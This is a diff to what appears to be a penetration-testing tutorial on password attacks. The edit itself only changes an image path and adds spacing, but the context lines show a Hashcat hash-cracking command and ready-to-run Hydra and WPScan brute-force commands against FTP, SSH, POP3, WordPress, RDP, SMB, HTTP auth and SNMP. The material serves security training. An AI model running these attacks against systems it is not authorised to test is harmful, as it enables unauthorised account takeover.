@@ -34,7 +34,7 @@ We will now try to crack the hash with ***Hashcat*** by specifying the hash file
 hashcat --force -m 0 -a 0 hash.txt rockyou.txt
 ```
 
-![Hashcat](/assets/img/Pass/2_hashcat.png)
+![Hashcat](/assets/img/Pass/3_hashcat.png)
 
 After it shows us a couple of warnings about using --force, it takes a few seconds to sort it's life out and then starts the cracking, which takes it less than a second.
 
@@ -63,34 +63,42 @@ If the service you are attacking is running on a *non-standard* port, you must s
 ```shell
 hydra -t 1 -l user -P rockyou.txt -vV $ip ftp
 ```
+
     **SSH**
 ```shell
 hydra -v -V -u -l user -P rockyou.txt -t 4 -u $ip ssh
 ```
+
     **POP3**
 ```shell
 hydra -l user -P rockyou.txt -f $ip pop3 -V -t 1
 ```
+
     **Wordpress**
 ```shell
 hydra -l user -P rockyou.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
 ```
+
     **WPscan for Wordpress**
 ```shell
 wpscan --url $ip -U user -P rockyou.txt
 ```
+
     **Windows RDP**
 ```shell
 hydra -t 1 -V -f -l user -P rockyou.txt rdp://$ip
 ```
+
     **SMB**
 ```shell
 hydra -t 1 -V -f -l user -P rockyou.txt $ip smb
 ```
+
     **401 Auth**
 ```shell
 hydra -l user -P rockyou.txt $ip http-get /path
 ```
+
     **SNMP**
 ```shell
 hydra -P rockyou.txt -v $ip snmp
